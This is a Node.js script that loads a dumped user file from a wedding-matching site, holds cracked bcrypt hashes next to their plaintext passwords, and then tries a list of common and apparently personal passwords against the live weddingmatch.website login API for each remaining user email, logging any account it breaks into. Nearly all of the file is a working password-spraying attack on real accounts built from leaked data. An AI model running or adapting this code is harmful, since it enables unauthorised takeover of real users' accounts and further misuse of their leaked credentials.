import fs from 'fs';

let content = fs.readFileSync('scratch/all-users-detail.json', 'utf8');
if (content.charCodeAt(0) === 0xFEFF) content = content.slice(1);
const users = JSON.parse(content);

const knownPasswords = new Map();
// 176 customers
knownPasswords.set('$2a$11$jaWuWOwGuPi4M97wBtPUT.SFlnN/jCKtNthzVK92YFQx8QuGG5k12', '123456');
// 54 vendors
knownPasswords.set('$2a$11$nfbHMx2AHo..Jc1yc.ber.F.Z.SvcWlygHm5kT5YfWZuhTPQZiote', '1234567890');
// 2 vendors
knownPasswords.set('$2a$11$0PjHDTCkg3pqLrrCCzjqOODLDro2IFaUJobC94Xi6AhtXjrEqq0ZC', '123456');

const candidates = [
  '123456', '12345678', '123456789', '1234567890',
  'Password123!', 'Password@123', 'Password123',
  'Admin@123', 'Admin@123!', 'admin123', 'Admin123', 'admin',
  'wedding123', 'wedding@123', 'weddingmatch',
  'T@i2101200622122005', 'whoami21012006', 'anhduc21165',
  '123456aA@', 'Abc@12345', 'Dung123!', 'Minh123!', 'Thao123!', 'Dat123!'
];

const remainingUsers = users.filter(u => !knownPasswords.has(u.PasswordHash) && u.Email);

console.log(`Checking ${remainingUsers.length} users with unknown password...`);

for (const u of remainingUsers) {
  let found = false;
  for (const pwd of candidates) {
    try {
      const res = await fetch('https://weddingmatch.website/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: u.Email, password: pwd })
      });
      if (res.ok) {
        console.log(`FOUND: ${u.Email} (${u.Role}) => ${pwd}`);
        knownPasswords.set(u.PasswordHash, pwd);
        found = true;
        break;
      }
    } catch (e) {}
  }
  if (!found) {
    console.log(`Not found for ${u.Email} (${u.Role})`);
  }
}

